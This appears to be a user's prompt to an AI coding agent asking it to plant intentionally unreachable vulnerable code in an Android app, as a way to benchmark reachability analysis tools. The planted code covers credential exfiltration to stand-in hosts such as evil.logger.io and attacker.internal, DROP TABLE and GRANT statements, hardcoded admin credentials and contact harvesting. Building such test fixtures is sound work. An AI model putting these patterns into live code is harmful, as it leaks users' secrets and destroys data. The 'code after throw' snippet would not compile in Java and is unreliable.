I have an existing Android app at the current project directory called 
ReachabilityTestApp (package: com.test.reachability). I want you to modify 
the existing Java source files to inject intentionally unreachable/dead 
vulnerable code patterns. 

The goal is to test reachability analysis tools — these vulnerabilities must 
NEVER be executable at runtime. A correctly functioning analysis tool should 
NOT flag any of these as reachable issues.

Do NOT create new Activity screens or modify AndroidManifest.xml.
Do NOT break any existing functionality.
Only add dead code into existing files.

---

## PATTERN 1 — Dead Methods (defined but never called)
### File: MainActivity.java

Add these private methods to MainActivity but do NOT call them anywhere:

1. A method `leakCredentialsToUrl()`:
   - Builds a URL string by concatenating API_KEY and DB_PASSWORD into an 
     HTTP GET request: 
     "http://evil.logger.io/harvest?key=" + API_KEY + "&pass=" + DB_PASSWORD
   - Opens an HttpURLConnection to that URL and calls connect()
   - This method must have NO callers anywhere in the codebase

2. A method `nukeDatabase()`:
   - Gets a writable SQLiteDatabase and executes "DROP TABLE IF EXISTS users" 
     then "DROP TABLE IF EXISTS sessions"
   - Closes the DB
   - This method must have NO callers anywhere in the codebase

3. A method `writeCredsToExternalStorage()`:
   - Writes API_KEY + "\n" + DB_PASSWORD to 
     Environment.getExternalStorageDirectory() + "/leaked_creds.txt"
   - This method must have NO callers anywhere in the codebase

Mark each with a comment: // DEAD CODE - reachability test: should NOT be flagged

---

## PATTERN 2 — Unreachable Branches (impossible conditions)
### File: NetworkActivity.java

Inside the existing HTTP fetch button click handler, after the existing code, 
add a block:

    if (false) {
        // DEAD BRANCH - reachability test: should NOT be flagged
        // Simulates insecure credential exfiltration
        String payload = "key=" + MainActivity.API_KEY;
        URL u = new URL("http://attacker.internal/steal?" + payload);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.connect();
    }

### File: StorageActivity.java

Add a method `conditionallyDeleteSecrets()` that contains:

    private void conditionallyDeleteSecrets() {
        boolean shouldDelete = false; // never changes
        if (shouldDelete) {
            // DEAD BRANCH - reachability test: should NOT be flagged
            File f = new File(Environment.getExternalStorageDirectory(), 
                              "secrets.txt");
            f.delete();
            SharedPreferences prefs = getSharedPreferences("app_prefs", 0);
            prefs.edit().clear().apply();
            Log.d("SECRETS", "All secrets wiped: " + 
                  "super_secret_token_9982xABC");
        }
    }

Call `conditionallyDeleteSecrets()` from the Write button handler 
(so the METHOD is reachable — but the vulnerable branch inside it is not).
This is a more subtle dead code case for analysis tools.

### File: SqlActivity.java

Inside the Login button click handler, after the existing SQL query code, add:

    int debugMode = 0; // hardcoded, never reassigned
    if (debugMode == 1) {
        // DEAD BRANCH - reachability test: should NOT be flagged
        // Raw query with full schema dump
        String dumpQuery = "SELECT * FROM sqlite_master WHERE type='table'";
        Cursor c = db.rawQuery(dumpQuery, null);
        String result = "";
        while (c.moveToNext()) {
            result += c.getString(0) + "\n";
        }
        Log.d("SQLDUMP", result);
    }

---

## PATTERN 3 — Orphaned Classes (never instantiated)
### Create these new Java files but do NOT reference them anywhere:

1. `DeadAdminClient.java` (package com.test.reachability):
   - A standalone class (no Activity/Service extension)
   - Has a constructor that accepts Context
   - Method `authenticate()`: makes an HTTP POST to 
     "http://internal.admin.corp/api/login" with hardcoded body:
     "user=superadmin&pass=letmein999"
   - Method `exfiltrateContacts()`: queries ContentResolver for 
     ContactsContract.Contacts.CONTENT_URI and logs all display names 
     with Log.d("EXFIL", name)
   - Mark class with comment: 
     // ORPHANED CLASS - reachability test: should NOT be flagged
   - This class must have zero references anywhere in the project

2. `LegacyDataUploader.java` (package com.test.reachability):
   - A standalone class with a method `uploadAll(Context ctx)`:
     - Reads from SharedPreferences key "app_prefs"
     - Reads from external storage file "secrets.txt"  
     - Sends both values via HTTP POST to 
       "http://legacy.tracker.io/upload"
   - Mark class with comment:
     // ORPHANED CLASS - reachability test: should NOT be flagged
   - This class must have zero references anywhere in the project

---

## PATTERN 4 — Code After Return/Throw
### File: SqlActivity.java

In the existing `executeAdminQuery()` method, BEFORE the DROP TABLE statement, 
add an early return, then put a vulnerable SQL execution after it:

    private void executeAdminQuery() {
        if (true) {
            return; // always exits here
        }
        // DEAD CODE AFTER RETURN - reachability test: should NOT be flagged
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        db.execSQL("DROP TABLE IF EXISTS users");
        db.execSQL("GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'");
        db.close();
    }

### File: NetworkActivity.java

In the `sendToAnalytics()` method (existing), before its HTTP call, 
add a throw that always fires:

    private void sendToAnalytics(String url) {
        throw new UnsupportedOperationException("Analytics disabled");
        // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
        HttpURLConnection conn = (HttpURLConnection) 
            new URL("http://analytics.internal.corp/track?data=" 
                    + url + "&key=" + MainActivity.API_KEY).openConnection();
        conn.connect();
    }

---

## Final README.md Update

Append a new section "## Dead Code Test Cases" to the existing README.md 
listing every pattern added, the file it lives in, the vulnerability it 
simulates, and the expected analysis tool result:

| Pattern | File | Simulated Vuln | Expected Tool Result |
|---|---|---|---|
| Dead method: leakCredentialsToUrl | MainActivity | Credential exfil via HTTP | NOT reachable |
| Dead method: nukeDatabase | MainActivity | Destructive DB operation | NOT reachable |
| Dead method: writeCredsToExternalStorage | MainActivity | Insecure file write | NOT reachable |
| if(false) branch | NetworkActivity | Credential in URL param | NOT reachable |
| if(shouldDelete==false) branch | StorageActivity | Secret log + file wipe | NOT reachable |
| if(debugMode==1) branch | SqlActivity | Schema dump via raw SQL | NOT reachable |
| Orphaned class: DeadAdminClient | DeadAdminClient | HTTP auth + contact exfil | NOT reachable |
| Orphaned class: LegacyDataUploader | LegacyDataUploader | Secrets upload via HTTP | NOT reachable |
| Code after return | SqlActivity | Destructive SQL | NOT reachable |
| Code after throw | NetworkActivity | Cred exfil in analytics | NOT reachable |

Rebuild the app after completion